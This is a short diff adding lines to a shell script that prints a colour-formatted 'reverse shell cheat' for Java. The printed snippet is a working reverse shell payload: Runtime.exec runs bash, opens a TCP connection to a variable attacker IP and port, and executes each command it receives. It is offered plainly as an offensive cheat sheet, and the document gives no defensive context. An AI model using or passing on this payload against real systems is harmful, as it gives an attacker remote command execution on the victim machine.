@@ -1,0 +1,4 @@
+echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [java]\033[m"
+echo -e "\t\033[1mr = Runtime.getRuntime()\033[m"
+echo -e "\t\033[1mp = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$IP/$PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])\033[m"
+echo -e "\t\033[1mp.waitFor()\033[m"
